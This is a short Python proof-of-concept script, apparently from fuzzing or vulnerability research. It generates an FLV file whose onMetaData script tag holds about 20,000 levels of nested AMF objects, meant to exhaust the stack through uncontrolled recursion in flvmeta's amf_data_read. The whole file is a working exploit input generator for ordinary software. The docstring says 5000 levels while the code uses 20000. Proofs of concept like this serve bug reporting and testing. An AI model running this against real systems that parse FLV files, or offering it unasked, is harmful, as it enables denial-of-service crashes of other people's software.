#!/usr/bin/env python3
"""
PoC generator for VULN 001: Uncontrolled Recursion in amf_data_read (flvmeta)
CWE-674: Uncontrolled Recursion via deeply nested AMF objects in FLV Script tag.
"""
import struct
import os

OUTPUT = "/data/ylwang/non-textfuzz/target/_poc/flvmeta/src_dump_raw_c/vuln_001.flv"
DEPTH = 20000  # nesting levels; increase to 20000+ if needed

def build_nested_amf():
    """Build 5000 levels of nested AMF objects iteratively to avoid Python recursion limit."""
    # Innermost value: AMF number (type 0x00 + 8-byte IEEE 754 double)
    data = b"\x00" + struct.pack(">d", 1.0)
    # Wrap iteratively: each level is an AMF object (0x03) with key "a" whose value is inner
    for _ in range(DEPTH):
        key = b"\x00\x01" + b"a"   # uint16 BE length=1 + "a"
        data = b"\x03" + key + data + b"\x00\x00\x09"
    return data

def build_flv():
    # AMF0: type string (0x02) + uint16 BE length + "onMetaData"
    tag_name = b"\x02" + struct.pack(">H", 10) + b"onMetaData"
    amf_payload = build_nested_amf()
    script_data = tag_name + amf_payload

    data_size = len(script_data)
    # Script tag body
    tag_type = b"\x12"
    size_bytes = struct.pack(">I", data_size)[1:]  # 3 bytes BE
    timestamp = b"\x00\x00\x00"
    timestamp_extended = b"\x00"
    stream_id = b"\x00\x00\x00"

    tag = tag_type + size_bytes + timestamp + timestamp_extended + stream_id + script_data
    prev_tag_size = struct.pack(">I", len(tag))

    # FLV header: signature + version(1) + flags(audio+video=0x05) + header_size(9)
    flv_header = b"FLV" + b"\x01" + b"\x05" + b"\x00\x00\x00\x09"
    # Previous tag size 0 before first tag
    initial_pts = b"\x00\x00\x00\x00"

    return flv_header + initial_pts + tag + prev_tag_size

def main():
    os.makedirs(os.path.dirname(OUTPUT), exist_ok=True)
    print(f"[*] Building {DEPTH}-level nested AMF object...")
    flv_bytes = build_flv()
    with open(OUTPUT, "wb") as f:
        f.write(flv_bytes)
    print(f"[*] Written {len(flv_bytes)} bytes to {OUTPUT}")

if __name__ == "__main__":
    main()
